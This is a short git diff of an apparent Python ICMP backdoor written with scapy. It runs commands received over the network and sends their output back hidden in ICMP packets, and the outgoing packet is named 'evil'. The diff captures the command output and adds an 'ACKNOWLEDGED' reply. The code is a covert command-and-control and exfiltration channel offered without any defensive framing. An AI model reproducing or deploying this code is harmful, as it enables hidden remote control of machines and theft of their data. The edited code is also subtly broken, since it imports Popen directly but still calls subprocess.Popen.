@@ -1,6 +1,6 @@
 from scapy.all import *
 from scapy.all import IP,ICMP
-import subprocess
+from subprocess import Popen, PIPE
 
 def send_over_icmp(server, response):
     serverresponse = "###" + response
@@ -8,13 +8,15 @@ def send_over_icmp(server, response):
     send(evil)
 
 def execute_command(server, command):
-    p = subprocess.Popen(command, shell=True)
+    p = subprocess.Popen(command, stdout=PIPE, stderr=PIPE)
     output, error = p.communicate()
     send_over_icmp(server, output)
 
 def reply(src, command):
     if command == "PING":
             send_over_icmp(src, "PONG")
+    else:
+        send_over_icmp(src, "ACKNOWLEDGED")
 
 def handle(pkt):
     src = pkt[IP].dst
